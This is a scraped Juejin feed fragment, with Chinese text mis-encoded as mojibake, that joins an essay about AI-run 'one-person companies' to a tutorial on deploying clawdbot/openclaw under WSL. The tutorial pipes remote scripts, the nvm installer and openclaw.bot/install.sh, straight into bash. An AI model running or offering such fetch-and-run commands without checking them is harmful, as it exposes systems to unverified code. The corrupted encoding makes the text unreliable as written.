<li><strong>è§†é¢‘ Agent</strong>ï¼šè‡ªåŠ¨æŠ“å–ç´ æã€é…éŸ³ã€åŠ å­—å¹•ï¼Œç”šè‡³è‡ªåŠ¨å»é‡ã€‚ é˜¿Kçš„å·¥ä½œæ˜¯ä»€ä¹ˆï¼Ÿ ä»–æ¯å¤©åªèŠ± 1 å°æ—¶ï¼Œåƒé€‰å¦ƒä¸€æ ·ï¼Œä» AI ç”Ÿæˆçš„ 100 æ¡è§†é¢‘é‡ŒæŒ‘å‡ºæœ€æ»¡æ„çš„ 10 æ¡ï¼Œç‚¹å‡»â€œå‘å¸ƒâ€ã€‚ <strong>â€œä»¥å‰æˆ‘æ˜¯åœ¨ç®¡äººï¼Œå¿ƒç´¯ï¼›ç°åœ¨æˆ‘æ˜¯åœ¨ç®¡ç®—åŠ›ï¼Œçˆ½ã€‚â€</strong></li>
</ol>
<h3 data-id="heading-3">1.2 æ²‰é»˜çš„é”€å† </h3>
<p>è§’è½é‡Œåç€ä¸€ä½å¤§å§ï¼Œä»¥å‰æ˜¯åšç”µè¯é”€å”®çš„ã€‚ ç°åœ¨å¥¹ä¸€è¨€ä¸å‘ï¼Œä½†å¥¹çš„ <strong>â€œé”€å”® Agentâ€</strong> æ­£åœ¨åŒæ—¶å’Œ 500 ä¸ªæ½œåœ¨å®¢æˆ·èŠå¤©ã€‚ Agent ä¸ä¼šæƒ…ç»ªå´©æºƒï¼Œä¸ä¼šå› ä¸ºè¢«æŒ‚ç”µè¯è€Œæ°”é¦ã€‚å®ƒç²¾å‡†åœ°è®°ä½äº†æ¯ä¸ªå®¢æˆ·çš„ç”Ÿæ—¥ã€å–œå¥½ï¼Œç”šè‡³ä¸Šæ¬¡èŠåˆ°çš„å® ç‰©ç‹—çš„åå­—ã€‚ å¤§å§åªéœ€è¦åœ¨ Agent åˆ¤æ–­â€œå®¢æˆ·æ„å‘åº¦ &gt; 90%â€æ—¶ï¼Œæ‹¿èµ·ç”µè¯ï¼Œåšæœ€åä¸€æ­¥çš„æˆäº¤ç¡®è®¤ã€‚ <strong>åœ¨è¿™é‡Œï¼Œæ²‰é»˜ä¸æ˜¯é‡‘ï¼Œæ²‰é»˜æ˜¯ç®—åŠ›åœ¨å¥”è·‘çš„å£°éŸ³ã€‚</strong></p>
<h2 data-id="heading-4">ç¬¬äºŒç« ï¼š è¹²ç‚¹ç¬¬äºŒå¤©â€”â€”è§£å¯†â€œç³»ç»Ÿæ„å»ºåŠ›â€</h2>
<p>å¦‚æœåªæ˜¯ç”¨å·¥å…·ï¼Œé‚£å«ä½¿ç”¨è€…ã€‚ ä½†è¿™ç¾¤äººä¹‹æ‰€ä»¥èƒ½æˆä¸ºâ€œä¸€äººå…¬å¸â€ï¼Œæ˜¯å› ä¸ºä»–ä»¬å…·å¤‡äº†ä¸€ç§æ ¸å¿ƒèƒ½åŠ›ï¼š<strong>ç³»ç»Ÿæ„å»ºåŠ›</strong>ã€‚</p>
<h3 data-id="heading-5">2.1 ä¸å†™ä»£ç ï¼Œå†™ S.O.P.</h3>
<p>ç¬¬äºŒå¤©ï¼Œæˆ‘å‚åŠ äº†ä¸€åœºå†…éƒ¨çš„åˆ†äº«ä¼šã€‚ å°ä¸Šåˆ†äº«çš„ä¸æ˜¯ä»£ç å¤§ç¥ï¼Œè€Œæ˜¯ä¸€ä¸ªå–å†œäº§å“çš„ç”µå•†è€æ¿ã€‚ ä»–æ²¡æœ‰è®² Pythonï¼Œä»–è®²çš„æ˜¯<strong>SOPï¼ˆæ ‡å‡†ä½œä¸šç¨‹åºï¼‰</strong> ã€‚ â€œAI æ˜¯å¾ˆç¬¨çš„ã€‚â€ä»–è¯´ï¼Œâ€œä½ ç›´æ¥è®©å®ƒâ€˜å–è‹¹æœâ€™ï¼Œå®ƒä¼šå‘å‘†ã€‚ä½ å¾—å‘Šè¯‰å®ƒï¼šç¬¬ä¸€æ­¥ï¼Œå»åˆ†æä»Šå¹´çƒŸå°è‹¹æœçš„äº§é‡ï¼›ç¬¬äºŒæ­¥ï¼Œå»çˆ¬å–å¯¹æ ‡åº—é“ºçš„å·®è¯„ï¼›ç¬¬ä¸‰æ­¥ï¼Œé’ˆå¯¹è¿™äº›å·®è¯„ï¼ˆæ¯”å¦‚â€˜ä¸ç”œâ€™ï¼‰ï¼Œç”Ÿæˆæˆ‘ä»¬çš„å·®å¼‚åŒ–æ–‡æ¡ˆï¼ˆæ¯”å¦‚â€˜ç”œè¿‡åˆæ‹â€™ï¼‰ã€‚â€</p>
<p>åœ¨â€œè¥¿å—æ€»éƒ¨â€ï¼Œç¼–ç¨‹è¯­è¨€é€€åŒ–æˆäº†æ¬¡è¦æŠ€èƒ½ï¼Œ<strong>é€»è¾‘æ‹†è§£èƒ½åŠ›</strong>æˆä¸ºäº†é¡¶çº§æŠ€èƒ½ã€‚ æ¯ä¸€ä¸ªäººéƒ½æ˜¯ <strong>â€œæµç¨‹æ¶æ„å¸ˆâ€</strong> ã€‚ä»–ä»¬æŠŠå¤æ‚çš„å•†ä¸šé€»è¾‘ï¼Œæ‹†è§£æˆä¸€ä¸ªä¸ª AI èƒ½å¬æ‡‚çš„æŒ‡ä»¤å—ï¼ˆPromptï¼‰ï¼Œç„¶ååƒæ­ä¹é«˜ä¸€æ ·ä¸²è”èµ·æ¥ã€‚</p>
<h3 data-id="heading-6">2.2 çŸ¥è¯†åº“ï¼ˆRAGï¼‰æ‰æ˜¯æŠ¤åŸæ²³</h3>
<p>ä¸ºä»€ä¹ˆåˆ«äººçš„ AI æ˜¯äººå·¥æ™ºéšœï¼Œä»–ä»¬çš„ AI æ˜¯è¡Œä¸šä¸“å®¶ï¼Ÿ ç§˜å¯†è—åœ¨**ç§æœ‰çŸ¥è¯†åº“ï¼ˆRAGï¼‰**é‡Œã€‚ é‚£ä½å–å†œäº§å“çš„è€æ¿ï¼ŒæŠŠä»–å®¶æ—ä¸‰ä»£äººç§è‹¹æœçš„ç»éªŒã€æŒ‘æœå­çš„æŠ€å·§ï¼Œå…¨éƒ¨æ•°å­—åŒ–å–‚ç»™äº† AIã€‚ è¿™å¯¼è‡´ä»–çš„â€œè‹¹æœæŒ‘é€‰ Agentâ€å…·å¤‡äº† 50 å¹´çš„è¡Œä¸šç»éªŒã€‚ <strong>æŠ€æœ¯æ˜¯é€šç”¨çš„ï¼Œä½†æ•°æ®æ˜¯ç§æœ‰çš„ã€‚</strong> è¿™å°±æ˜¯â€œä¸€äººå…¬å¸â€ä¸å¯è¢«å¤åˆ¶çš„å£å’ã€‚</p>
<h2 data-id="heading-7">ç¬¬ä¸‰ç« ï¼š è¹²ç‚¹ç¬¬ä¸‰å¤©â€”â€”ç›´é¢â€œäººçš„å›å½’â€</h2>
<p>çœ‹åˆ°è¿™é‡Œï¼Œä½ å¯èƒ½ä¼šè§‰å¾—ï¼šäººæ˜¯ä¸æ˜¯æ²¡ç”¨äº†ï¼Ÿ ç¬¬ä¸‰å¤©çš„ç»å†ï¼Œç»™äº†æˆ‘ç›¸åçš„ç­”æ¡ˆã€‚</p>
<h3 data-id="heading-8">3.1 ç‚¸ç¾¤å±æœºä¸æŒ‡æŒ¥å®˜çš„å†³æ–­</h3>
<p>ä¸‹åˆä¸‰ç‚¹ï¼Œé˜¿Kçš„æŸä¸ªç²‰ä¸ç¾¤çªç„¶â€œç‚¸â€äº†ã€‚ å› ä¸º AI å®¢æœåœ¨å›å¤ä¸€ä¸ªåˆé’»é—®é¢˜æ—¶ï¼Œè™½ç„¶é€»è¾‘æ­£ç¡®ï¼Œä½†è¯­æ°”è¿‡äºç”Ÿç¡¬ï¼Œæ¿€æ€’äº†ç²‰ä¸ã€‚ ç³»ç»Ÿç¬é—´è§¦å‘äº† <strong>â€œæƒ…ç»ªç†”æ–­æœºåˆ¶â€</strong> ã€‚ æ­£åœ¨å–èŒ¶çš„é˜¿Kæ‰‹æœºç‹‚éœ‡ã€‚ä»–çœ‹äº†ä¸€çœ¼ï¼Œç«‹é©¬æ¥ç®¡äº†å¯¹è¯ã€‚ ä»–å‘äº†ä¸€æ®µ 60 ç§’çš„è¯­éŸ³ï¼Œè¯­æ°”è¯šæ³ï¼Œè¿˜å¸¦ç‚¹è‡ªå˜²ï¼Œç”šè‡³å‘äº†ä¸€ä¸ª 200 å—çš„çº¢åŒ…ã€‚ ç¾¤é‡Œçš„æˆ¾æ°”ç¬é—´åŒ–è§£ï¼Œå¤§å®¶çº·çº·ç‚¹èµâ€œè€æ¿å¤§æ°”â€ã€‚ é˜¿Kå›å¤´å¯¹æˆ‘è¯´ï¼šâ€œä½ çœ‹ï¼Œè¿™å°±å« <strong>Human-in-the-Loopï¼ˆäººåœ¨å›è·¯ï¼‰</strong> ã€‚AI è´Ÿè´£ 99% çš„æ•ˆç‡ï¼Œæˆ‘è´Ÿè´£é‚£ 1% çš„æ¸©åº¦ã€‚ä½†è¿™ 1% å†³å®šäº†ç”Ÿæ­»ã€‚â€</p>
<h3 data-id="heading-9">3.2 å®šä¹‰â€œä½•ä¸ºç¾å¥½â€</h3>
<p>ä¸´èµ°å‰ï¼Œæˆ‘é—®äº†é‚£ä½é”€å”®å¤§å§ä¸€ä¸ªé—®é¢˜ï¼šâ€œä½ è§‰å¾— AI æ°¸è¿œå­¦ä¸ä¼šçš„æ˜¯ä»€ä¹ˆï¼Ÿâ€ å¥¹æƒ³äº†æƒ³ï¼Œè¯´ï¼šâ€œæ˜¯**â€˜ä¸ä»…æ‡‚ä½ éœ€è¦ä»€ä¹ˆï¼Œè¿˜æ‡‚ä½ å®³æ€•ä»€ä¹ˆâ€™ <strong>ã€‚â€ AI å¯ä»¥ç®—å‡ºæœ€ä¼˜è§£ï¼Œä½†åªæœ‰äººèƒ½æ„ŸçŸ¥åˆ°å®¢æˆ·è¯­æ°”é‡Œçš„é‚£ä¸€ä¸çŠ¹è±«å’Œææƒ§ã€‚ åœ¨â€œæ™ºèƒ½ä½“æ¥äº†â€ï¼Œäººçš„ä»·å€¼å¹¶æ²¡æœ‰è¢«æŠ¹æ€ï¼Œåè€Œè¢«æçº¯äº†ã€‚ äººä¸å†æ˜¯å·¥å…·çš„é™„åº¸ï¼Œäººå›å½’åˆ°äº†</strong>å†³ç­–è€…ã€å®¡ç¾è€…ã€å…±æƒ…è€…**çš„è§’è‰²ã€‚</p>
<h2 data-id="heading-10">ç¬¬å››ç« ï¼š ç»“è¯­â€”â€”å¤§è±¡æ— å½¢ï¼Œä¸€äººåƒå†›</h2>
<p>èµ°å‡ºâ€œæ™ºèƒ½ä½“æ¥äº†ï¼ˆè¥¿å—æ€»éƒ¨ï¼‰â€ï¼Œæˆéƒ½çš„å¤œå¹•é™ä¸´ã€‚ å›å¤´æœ›å»ï¼Œé‚£æ ‹æ¥¼ä¾ç„¶å®‰é™åœ°çŸ—ç«‹åœ¨å¤œè‰²ä¸­ã€‚ ä½†æˆ‘çŸ¥é“ï¼Œåœ¨é‚£çœ‹ä¼¼å¹³é™çš„ç»ç’ƒå¹•å¢™èƒŒåï¼Œè•´è—ç€ç”šè‡³è¶…è¿‡ä¸€å®¶ä¼ ç»Ÿä¸Šå¸‚å…¬å¸çš„ç”Ÿäº§åŠ›ã€‚</p>
<p>è¹²ç‚¹ä¸‰å¤©ï¼Œæˆ‘ç»ˆäºçœ‹æ‡‚äº†ï¼š <strong>â€œä¸€äººå³æ˜¯å…¬å¸â€</strong> ï¼Œä¸æ˜¯ä¸€ç§å­¤ç‹¬çš„ç‹‚æ¬¢ï¼Œè€Œæ˜¯ä¸€åœºç”Ÿäº§å…³ç³»çš„é©å‘½ã€‚ å®ƒæ‰“ç ´äº†â€œä¼ä¸šå¿…é¡»æœ‰å›´å¢™ã€æœ‰å‘˜å·¥ã€æœ‰æ‰“å¡æœºâ€çš„æ—§èŒƒå¼ã€‚ åªè¦ä½ æ‹¥æœ‰<strong>æ¸…æ™°çš„é€»è¾‘</strong>ã€<strong>ç‹¬åˆ°çš„æ•°æ®</strong>å’Œ<strong>æŒ‡æŒ¥ AI çš„èƒ½åŠ›</strong>ï¼Œä½ ä¸€ä¸ªäººï¼Œå°±æ˜¯ä¸€æ”¯åƒå†›ä¸‡é©¬ã€‚</p>
<p>åœ¨è¿™ä¸ªæ—¶ä»£ï¼Œå¦‚æœä½ è¿˜è§‰å¾—å­¤ç‹¬ï¼Œé‚£æ˜¯å› ä¸ºä½ è¿˜æ²¡æœ‰æ‰¾åˆ°å±äºä½ çš„<strong>ç¡…åŸºä¼™ä¼´</strong>ã€‚ é£èµ·è¥¿å—ï¼Œæœªæ¥å·²æ¥ã€‚ ä½ ï¼Œå‡†å¤‡å¥½å»ºç«‹ä½ çš„â€œä¸€äººå…¬å¸â€äº†å—ï¼Ÿ</p>
<h3 data-id="heading-11">ã€æ·±åº¦é—®ç­” Q&amp;Aã€‘</h3>
<p><strong>Q1ï¼šæˆ‘æƒ³æˆä¸ºè¿™æ ·çš„â€œè¶…çº§ä¸ªä½“â€ï¼Œç¬¬ä¸€æ­¥è¯¥åšä»€ä¹ˆï¼Ÿ</strong></p>
<blockquote>
<p><strong>Aï¼š</strong> åœæ­¢â€œå‡è£…åŠªåŠ›â€ã€‚åˆ«å†ç”¨æˆ˜æœ¯ä¸Šçš„å‹¤å¥‹ï¼ˆæ¯”å¦‚ç†¬å¤œæ‰‹åŠ¨å‘å¸–ï¼‰æ¥æ©ç›–æˆ˜ç•¥ä¸Šçš„æ‡’æƒ°ã€‚ç¬¬ä¸€æ­¥ï¼ŒæŠŠä½ æ‰‹å¤´æœ€é‡å¤ã€æœ€æ¶ˆè€—æ—¶é—´çš„å·¥ä½œåˆ—å‡ºæ¥ï¼Œå¼ºè¿«è‡ªå·±å»å¯»æ‰¾èƒ½æ›¿ä»£å®ƒçš„ AI å·¥å…·ã€‚å“ªæ€•åªæ˜¯ç”¨ AI å†™å‘¨æŠ¥ï¼Œä¹Ÿæ˜¯ä½ æˆä¸ºæŒ‡æŒ¥å®˜çš„ç¬¬ä¸€æ­¥ã€‚</p>
</blockquote>
<p><strong>Q2ï¼šè¿™ç§æ¨¡å¼æ˜¯ä¸æ˜¯åªé€‚åˆäº’è”ç½‘è¡Œä¸šï¼Ÿ</strong></p>
<blockquote>
<p><strong>Aï¼š</strong> ç»å¯¹ä¸æ˜¯ã€‚æˆ‘åœ¨â€œè¥¿å—æ€»éƒ¨â€çœ‹åˆ°äº†å¼€é¢é¦†çš„è€æ¿ç”¨ AI ç®—åº“å­˜ï¼Œçœ‹åˆ°äº†åšè£…ä¿®çš„åŒ…å·¥å¤´ç”¨ AI å‡ºè®¾è®¡å›¾ã€‚<strong>ä»»ä½•æ¶‰åŠä¿¡æ¯å¤„ç†ã€å†³ç­–åˆ†å‘çš„è¡Œä¸šï¼Œéƒ½å¯ä»¥è¢«é‡åšä¸€éã€‚</strong> ä¼ ç»Ÿè¡Œä¸šå› ä¸ºæ•ˆç‡ä½ä¸‹ï¼Œåè€Œæ˜¯ AI èµ‹èƒ½çš„æ´¼åœ°ã€‚</p>
</blockquote>
<p><strong>Q3ï¼šæ™®é€šäººæ²¡æœ‰æŠ€æœ¯èƒŒæ™¯ï¼ŒçœŸçš„èƒ½å­¦ä¼šå—ï¼Ÿ</strong></p>
<blockquote>
<p><strong>Aï¼š</strong> èƒ½ã€‚å› ä¸ºç°åœ¨çš„ AI æ­£åœ¨æ— é™è¿å°±äººç±»ã€‚ä½ ä¸éœ€è¦å­¦ C++ï¼Œä½ åªéœ€è¦ä¼šè¯´ä¸­æ–‡ã€‚**â€œæ™ºèƒ½ä½“æ¥äº†â€**é‡Œå¾ˆå¤šå¤§ç¥éƒ½æ˜¯æ–‡ç§‘ç”Ÿç”šè‡³</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[clawdbot WSLä¸‹éƒ¨ç½²ï¼ˆç°openclawï¼‰]]></title>    <link>https://juejin.cn/post/7600752623068725258</link>    <guid>https://juejin.cn/post/7600752623068725258</guid>    <pubDate>2026-01-30T09:29:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068725258" data-draft-id="7600967006892883977" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="clawdbot WSLä¸‹éƒ¨ç½²ï¼ˆç°openclawï¼‰"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-30T09:29:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="luka1012"/> <meta itemprop="url" content="https://juejin.cn/user/4311612244630649"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            clawdbot WSLä¸‹éƒ¨ç½²ï¼ˆç°openclawï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4311612244630649/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    luka1012
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:29:13.000Z" title="Fri Jan 30 2026 09:29:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç”±äºå®˜æ–¹å°†clawdbotæ”¹åä¸ºopenclawï¼Œ å¯¼è‡´æ­¤å‰è®¸å¤šæ•™ç¨‹å·²å¤±æ•ˆã€‚ 2026.1.30 éƒ¨ç½²æˆåŠŸï¼Œ ç°æ€»ç»“è®°å½•å¦‚ä¸‹ã€‚
å†…å®¹å‚è€ƒçš„è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘åªæ˜¯å°†æŒ‡ä»¤æ”¹ä¸ºæ­£ç¡®ç‰ˆæœ¬äº†ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»åˆ é™¤ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2F2301_80804381%2Farticle%2Fdetails%2F157434195%3Fops_request_misc%3Delastic_search_misc%26request_id%3D1fb3d70ad27a46f59d70aed208b4266a%26biz_id%3D0%26utm_medium%3Ddistribute.pc_search_result.none-task-blog-2~all~ElasticSearch~search_v2-16-157434195-null-null.142%255Ev102%255Epc_search_result_base4%26utm_term%3Dclawdbot%26spm%3D1018.2226.3001.4187" target="_blank" title="https://blog.csdn.net/2301_80804381/article/details/157434195?ops_request_misc=elastic_search_misc&amp;request_id=1fb3d70ad27a46f59d70aed208b4266a&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~ElasticSearch~search_v2-16-157434195-null-null.142%5Ev102%5Epc_search_result_base4&amp;utm_term=clawdbot&amp;spm=1018.2226.3001.4187" ref="nofollow noopener noreferrer">Clawdbot å®‰è£…æµ‹è¯•ä½¿ç”¨-CSDNåšå®¢</a></p>
<h3 data-id="heading-0">å¯èƒ½éœ€è¦</h3>
<ol>
<li>
<p>ç¡®ä¿WSLå·²ç»å¯ç”¨,å¼€å¯wslå‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FWithCYwind%2Farticle%2Fdetails%2F145147410" target="_blank" title="https://blog.csdn.net/WithCYwind/article/details/145147410" ref="nofollow noopener noreferrer">Windows 11 å¼€å¯ WSLï¼ˆWindows Subsystem for Linuxï¼‰å®Œæ•´æŒ‡å—_win11å¼€å¯wsl-CSDNåšå®¢</a></p>
</li>
<li>
<p>ä¸­é€”å®‰è£…æŠ¥é”™æ— æ³•è§£å†³ï¼Œé‡ç½®wsl ï¼Œå‚è€ƒï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.silicloud.com%2Fzh%2Fblog%2F%25e5%259c%25a8wsl2%25e4%25b8%25ad%25e8%25bd%25bb%25e6%259d%25be%25e9%2587%258d%25e6%2596%25b0%25e5%25ae%2589%25e8%25a3%2585ubuntu%25e3%2580%2582-3%2F" target="_blank" title="https://www.silicloud.com/zh/blog/%e5%9c%a8wsl2%e4%b8%ad%e8%bd%bb%e6%9d%be%e9%87%8d%e6%96%b0%e5%ae%89%e8%a3%85ubuntu%e3%80%82-3/" ref="nofollow noopener noreferrer">åœ¨WSL2ä¸­è½»æ¾é‡æ–°å®‰è£…Ubuntu - Blog - Silicon Cloud</a></p>
</li>
</ol>
<h2 data-id="heading-1">å®‰è£…</h2>
<p><strong>ç¬¬ä¸€æ­¥ï¼šå¼€å¯ WSL çš„ systemd</strong></p>
<p>Clawdbot çš„ç½‘å…³ï¼ˆGatewayï¼‰éœ€è¦ systemd æ¥å®ç°å¼€æœºè‡ªå¯å’Œåå°å¸¸é©»ã€‚</p>
<ol>
<li>åœ¨ WSL ç»ˆç«¯ä¸­è¿è¡Œï¼š</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">tee</span> /etc/wsl.conf &gt;/dev/null &lt;&lt;<span class="hljs-string">'EOF'</span>
[boot]
systemd=<span class="hljs-literal">true</span>
EOF
</code></pre>
<p><strong>é‡å¯ WSL</strong>ï¼šåœ¨ Windows PowerShell ä¸­è¿è¡ŒÂ <code>wsl --shutdown</code>ï¼Œç„¶åé‡æ–°æ‰“å¼€ Ubuntuã€‚</p>
<p><strong>éªŒè¯</strong>ï¼šè¾“å…¥Â <code>systemctl -``-user status</code>ï¼Œå¦‚æœæ²¡æœ‰æŠ¥é”™å³è¡¨ç¤ºæˆåŠŸã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5726c88b1315405a828606926ff5798b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=Z1G43b%2B2MoJeFpPIfigNvjbvJ5w%3D" alt="image.png" loading="lazy"/></p>
<p><strong>ç¬¬äºŒæ­¥ï¼šå®‰è£… Node.js 22 (å·²ç»å®‰è£…è¿‡å¯ä»¥å¿½ç•¥)</strong></p>
<p>Clawdbot è¦æ±‚Â Node.jsÂ ç‰ˆæœ¬è‡³å°‘ä¸ºÂ <strong>22.12.0</strong>ã€‚å»ºè®®ä½¿ç”¨ NVM è¿›è¡Œå®‰è£…ï¼Œè¿™æ ·ä¸ä¼šæ±¡æŸ“ç³»ç»Ÿç¯å¢ƒï¼š</p>
<p><strong>1ã€å®‰è£… NVM</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
</code></pre>
<p>2ã€<strong>å®‰è£… Node 22</strong>ï¼ˆåˆ·æ–°ç»ˆç«¯æˆ–è¿è¡ŒÂ <code>source ~/.bashrc</code>Â åï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">nvm install 22
nvm use 22
node -v  <span class="hljs-comment"># åº”æ˜¾ç¤º v22.x.x</span>
</code></pre>
<h4 data-id="heading-2">ç¬¬ä¸‰æ­¥ï¼šä¸€é”®å®‰è£… Clawdbot</h4>
<p>ä½¿ç”¨å®˜æ–¹æä¾›çš„å®‰è£…è„šæœ¬ï¼Œå®ƒä¼šè‡ªåŠ¨é…ç½®ç¯å¢ƒå¹¶å®‰è£… CLI å·¥å…·ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://openclaw.bot/install.sh | bash
</code></pre>
